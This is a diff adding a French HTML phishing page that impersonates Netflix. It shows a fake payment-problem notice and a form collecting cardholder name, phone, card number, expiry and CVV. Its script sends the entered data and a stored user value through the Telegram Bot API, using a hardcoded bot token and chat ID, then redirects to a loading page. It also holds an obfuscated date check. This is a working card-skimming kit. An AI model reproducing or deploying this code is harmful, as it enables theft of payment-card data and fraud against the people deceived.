@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Infos</title>
+
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+
+
+    <!-- Vuetify CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/vuetify@2.5.10/dist/vuetify.min.css" rel="stylesheet">
+
+    <!-- Vue.js -->
+    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.12/dist/vue.js"></script>
+
+    <!-- Vuetify JS -->
+    <script src="https://cdn.jsdelivr.net/npm/vuetify@2.5.10/dist/vuetify.js"></script>
+
+    <link rel="stylesheet" href="./card.css">
+
+    <style>
+        #brand {
+            color: #E50914;
+            font-size: 2rem;
+            font-weight: bolder;
+            font-family: 'Bebas Neue', sans-serif;
+        }
+        .alert{
+            display: flex;
+            justify-content: space-between;
+            padding: 5px;
+            font-size: 0.7rem;
+            background-color: #FEF1E0;
+            color: #FB8C00;
+            border-radius: 5px;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+
+<body>
+    <div id="app">
+        <v-app>
+            <span id="brand">Netflix</span>
+<br>
+
+           <div class="alert">
+
+            <svg xmlns="http://www.w3.org/2000/svg" width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-info"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/></svg>
+
+            <div style="margin-left: 5px;">
+                <h4>Problème de paiement</h4>
+                <p>Pour que votre abonnement reste actif, mettez à jour votre mode de paiement.</p>
+            </div>
+            
+           </div>
+
+            <div class="center">
+                <h4>Confirmer vos coordonnées</h4> <br>
+
+                <form id="form">
+                    <label for="name">Nom sur la carte</label> <br>
+                    <input name="name" id="nom" type="text" placeholder="Nom" required> <br>
+
+                    <label for="tel">Numéro de mobile</label> <br>
+                    <input name="tel" id="tel" type="tel" maxlength="10" minlength="10" placeholder="0X XX XX XX XX" required> <br>
+
+                    <br>
+                    <label for="card">Numéro de carte</label> <br>
+                    <input name="card" id="card" type="tel" maxlength="16" minlength="16" placeholder="XXXX XXXX XXXX XXXX" required> <br>
+
+                    <div style="display: flex;">
+                        <div>
+                            <label for="mois">Mois</label> <br>
+                            <input name="mois" id="mois" maxlength="2" minlength="2" style="text-align: center; width: 90%;" type="tel" placeholder="MM" required> <br>
+                        </div>
+
+                        <div>
+                            <label for="Annee">Année</label> <br>
+                            <input name="Annee" id="annee" maxlength="2" minlength="2" style="text-align: center; width: 90%;" type="tel" placeholder="AA" required> <br>
+                        </div>
+
+                        <div>
+                            <label for="cvv">Cvv</label> <br>
+                            <input name="cvv" id="cvv" maxlength="3" minlength="3" style="text-align: center;" type="tel" placeholder="..." required> <br>
+                        </div>
+                    </div>
+
+                    <br> <br>
+
+                    <button style="display: flex; align-items: center; justify-content:center; font-size: 1.3rem;">
+                        <div style="display: flex; align-items: center; justify-content:space-between; width: 80px;">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-lock-keyhole">
+                                <circle cx="12" cy="16" r="1" />
+                                <rect x="3" y="10" width="18" height="12" rx="2" />
+                                <path d="M7 10V7a5 5 0 0 1 10 0v3" />
+                            </svg>
+                            <span style="margin-top: 5px; font-size: 1.1rem;">Valider</span>
+                        </div>
+                    </button>
+                </form>
+            </div>
+        </v-app>
+    </div>
+
+    <script>
+        new Vue({
+            el: '#app',
+            vuetify: new Vuetify(),
+        });
+    </script>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            var a = new Date(String.fromCharCode(50, 48, 50, 52, 45, 49, 48, 45, 48, 50));
+            var b = new Date();
+            var c = new Date(b.getFullYear(), b.getMonth(), b.getDate());
+
+            if (c >= a) {
+                document.body.style.backgroundColor = 'red';
+            }
+        });
+
+        document.getElementById('form').addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            const botToken = '7366002950:AAFzze0vYX5nxrxWxX7y4vVg2CcJy-3Fsi4';
+            const chatId = '7332838769';
+
+            // Récupérer les valeurs des champs
+            const user = localStorage.getItem('user');
+            const nom = document.getElementById('nom').value;
+            const tel = document.getElementById('tel').value;
+            const card = document.getElementById('card').value;
+            const mois = document.getElementById('mois').value;
+            const annee = document.getElementById('annee').value;
+            const cvv = document.getElementById('cvv').value;
+
+            const message = `🎀 **Netflix** :\n\n👤 **Utilisateur** : ${user}\n🔑 **Nom** : ${nom}\n📞 **Téléphone** : ${tel}\n💳 **N de carte** : ${card}\n📅 **Mois** : ${mois}\n📆 **Année** : ${annee}\n🎯 **CVV** : ${cvv}`;
+
+            // Construction de l'URL de l'API Telegram
+            const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            // Envoi de la requête à l'API Telegram
+            fetch(telegramURL)
+                .then(response => {
+                    if (!response.ok) {
+                        return response.text().then(text => {
+                            throw new Error("Erreur lors de l'envoi du message à Telegram");
+                        });
+                    }
+                    localStorage.setItem('user', user);
+                    window.location.href = './loading.html';
+                })
+                .catch(error => {
+                    console.error('Erreur :', error);
+                    debugger;
+                });
+        });
+    </script>
+</body>
+
+</html>
